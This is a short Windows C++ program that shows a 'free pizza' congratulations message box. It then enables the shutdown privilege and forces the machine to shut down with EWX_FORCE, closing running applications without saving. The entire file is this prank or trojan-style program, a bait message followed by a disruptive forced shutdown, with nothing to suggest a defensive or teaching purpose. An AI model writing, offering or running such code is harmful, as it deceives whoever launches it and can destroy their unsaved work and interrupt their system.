#include <windows.h>
#include <iostream>
#include <string>

bool EnableShutdownPrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Open the process token.
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << '\n';
        return false;
    }

    // Get the LUID for the shutdown privilege.
    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << '\n';
        return false;
    }

    tkp.PrivilegeCount = 1;  // One privilege to set
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges to enable shutdown privilege.
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << '\n';
        return false;
    }

    if (GetLastError() != ERROR_SUCCESS) {
        std::cerr << "AdjustTokenPrivileges did not succeed. Error: " << GetLastError() << '\n';
        return false;
    }

    return true;
}

bool ShutdownSystem() {
    if (!EnableShutdownPrivileges()) {
        return false;
    }

    // Shut down the system and force applications to close.
    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER)) {
        std::cerr << "ExitWindowsEx failed. Error: " << GetLastError() << '\n';
        return false;
    }

    return true;
}

int main() {
    MessageBoxA(NULL, "Congratulations! You will get free pizza!!", "Free Pizza!", MB_OK | MB_ICONINFORMATION);
    if (ShutdownSystem()) {
        std::cout << "System shutdown initiated successfully." << std::endl;
    } else {
        std::cout << "Failed to initiate system shutdown." << std::endl;
    }

    return 0;
}
